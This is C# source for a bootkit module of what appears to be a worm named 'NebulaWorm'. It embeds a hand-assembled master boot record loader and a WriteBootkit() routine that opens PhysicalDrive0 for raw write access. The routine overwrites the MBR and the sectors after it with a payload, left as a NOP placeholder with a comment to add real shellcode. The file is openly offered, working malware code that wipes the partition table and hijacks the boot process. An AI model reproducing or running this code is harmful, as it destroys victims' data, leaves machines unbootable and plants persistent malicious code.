using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

namespace NebulaWorm//this module is risky if u dont want to have risk delete this module and Bootkit.WriteBootkit()
{
    public static class Bootkit
{
    private const int SectorSize = 512;
    private const int PayloadSectors = 80; // 40 KB / 512 bytes each sector

    // MBR loader (512 byte)
    private static readonly byte[] MBRLoader = new byte[SectorSize]
    {0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xBB, 0x00, 0x80, 0xB9,
0x50, 0x00, 0xBA, 0x02, 0x00, 0xB2, 0x80, 0x51, 0xB4, 0x42, 0xB0, 0x01, 0xCD, 0x13, 0x72, 0x0C,
0x81, 0xC3, 0x00, 0x02, 0x59, 0xE2, 0xF0, 0xEA, 0x00, 0x00, 0x00, 0x80, 0xF4, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};  //org 0x7C00
    //       cli
    //       xor ax, ax
    //       mov ds, ax
    //      mov es, ax
    //      mov ss, ax
    //      mov sp, 0x7C00

    //       mov bx, 0x8000       
    //        mov cx, 80           
    //       mov dx, 2            
    //       mov dl, 0x80         
    //
    //        read_loop:
    //       push cx
    //       mov ah, 0x42
    //       mov al, 1
    //       int 0x13
    //       jc fail
    //
    //        add bx, 512
    //        pop cx
    //       loop read_loop
    //
    //       jmp 0x8000:0000 jumps from lba2 to another sectors (80) reading the payload's  bytes
    //
    //        fail:
    //        hlt
    //
    //       times 510 - ($-$$) db 0
    //       dw 0xAA55


    // payload hex etc here
    private static readonly byte[] LargePayload = new byte[SectorSize * PayloadSectors];

    static Bootkit()
    {
        //example 
        for (int i = 0; i < LargePayload.Length; i++)
            LargePayload[i] = 0x90; // U NEED THE PAYLOAD HEX FOR THIS PART  !!!!! shellcode/assembly the 0x90 hex is just useless NOP
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern SafeFileHandle CreateFile(
        string lpFileName,
        FileAccess dwDesiredAccess,
        FileShare dwShareMode,
        IntPtr lpSecurityAttributes,
        FileMode dwCreationDisposition,
        int dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    public static bool WriteBootkit()
    {
        string physicalDrive = @"\\.\PhysicalDrive0";

        try
        {
            using (SafeFileHandle handle = CreateFile(physicalDrive,
                FileAccess.ReadWrite,
                FileShare.ReadWrite,
                IntPtr.Zero,
                FileMode.Open,
                0,
                IntPtr.Zero))
            {
                if (handle.IsInvalid)
                {
                    return false;
                }

                using (FileStream disk = new FileStream(handle, FileAccess.ReadWrite))
                {
                    // MBR loader write
                    disk.Seek(0, SeekOrigin.Begin);
                    disk.Write(MBRLoader, 0, MBRLoader.Length);

                    // write the payload starting from LBA2 to other sectors
                    long payloadOffset = SectorSize * 2;
                    disk.Seek(payloadOffset, SeekOrigin.Begin);
                    disk.Write(LargePayload, 0, LargePayload.Length);

                    disk.Flush();

             //optional debug message Console.WriteLine($"MBR And {PayloadSectors * SectorSize / 1024} KB payload Succesfully Written");
                    return true;
                }
            }
        }
        catch (Exception ex)
        {
            //optional debug message  //Console.WriteLine("Error " + ex.Message);
            return false;
        }
    }
}
}